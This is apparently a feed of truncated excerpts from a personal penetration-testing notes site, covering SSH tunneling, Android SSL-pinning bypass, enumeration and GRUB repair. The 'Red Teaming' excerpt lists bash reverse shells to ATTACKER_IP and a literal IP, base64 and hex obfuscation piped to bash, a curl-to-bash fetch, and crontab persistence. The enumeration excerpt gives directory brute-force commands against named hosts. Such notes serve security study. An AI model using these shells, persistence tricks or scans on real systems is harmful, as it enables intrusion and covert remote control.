item.title: Tunneling and Port Forwarding
item.description: SSH Tunnel config in /etc/ssh/sshd_config N - do not execute a remote command Socket tunnel with SSH ssh -ND 8080 username@12.12.12.12 Now configure SOCKS proxy to 127.0.0.1 port 8080, all the traffic is now tunneled through 12.12.12.12 as a VPN. Port forwarding with SSH Local port forwarding: ssh -g -NL 1337:12.12.12.150:8000 username@12.12.12.12 Now connect to 12.12.12.12 on port 1337 will get tunneled to 12.12.12.150 on port 8000 via 12.12.12.12 Remote port forwarding: GatewayPorts yes

item.title: Android Pentest
item.description: Bypass SSL pinning Install Burpsuiteâ€™s certificate to system store Export certificate with Certificate in DER format option and named burp.der Convert certificate to crt/pem format: openssl x509 -in burp.der -inform DER -out burp.crt Rename to <hash>.0, get hash: openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -n 1 rename: mv burp.crt 9a5ba575.0 Backup existing certs: adb shell "cp /system/etc/security/cacerts/* /tmp" Create an in-memory mount: adb shell "mount -t tmpfs tmpfs /system/etc/security/cacerts" Copy the existing certs back into the tmpfs mount: adb shell "mv /tmp/*.

item.title: Red Teaming
item.description: Reverse Shell Reverse shell with bash bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 In case shell causes the application to suspended, run in new session with setsid: setsid bash -i &>/dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 & By msfvenom: bash -c '0<&42-;exec 42<>/dev/tcp/10.110.28.5/4747;sh <&42 >&42 2>&42' Tricks and obfuscate: echo COMMAND_BASE64 | base64 -d | bash echo COMMAND_HEX | xxd -p -r | bash {echo,COMMAND_BASE64}|{base64,-d}|bash bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} curl http://ATTACKER_IP:PORT | bash #kind of a C&C Background reverse shell with loop and crontab while :; do REVERSE_SHELL_COMMAND; sleep 900; done &>/dev/null & echo "*/15 * * * * REVERSE_SHELL_COMMAND" > .

item.title: Enumeration
item.description: Subdomain Discovery Subdomain with amass amass enum -active -d hackerone.com -max-depth 3 -config amass.config.ini Example of config file https://github.com/OWASP/Amass/blob/master/examples/config.ini Others: subfinder, findomain, assetfinder Directory brute-force Wordlist: assetnote, Fuzzing/fuzz-Bo0oM.txt, Web-Content/common.txt Directory brute-force with ffuf ffuf -u http://118.70.116.235:8052/current_config/FUZZ -w ~/Downloads/assetnote/data/manual/raft-large-directories-lowercase.txt -ac -mc 200,204,301,307,400,401,403,405 -t 10 -e .js,.conf Directory brute-force with gobuster gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://hackerone.com/backups/ -t 20 -x zip,txt,log,db,json,js,conf --status-codes-blacklist Directory brute-force with wfuzz wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,php-txt-zip-log-db-json --hc 403,404 -t 20 -u http://10.

item.title: Operating System
item.description: Lost grub bootloader Some reasons lead to lost grub: Upgrade BIOS Reinstall windows while using dual OS Grub not installed in Linux installation progress Re-install grub bootloader Use boot-repair-disk as a rescue tool if can’t boot into linux os, setup into the USB and boot it up grub-install /dev/sda update-grub Check the disk with fdisk -l or blkid Using BOOTICE to modify UEFI uses efi files in EFI partition to boot the OS, as Windows is bootmgfw.
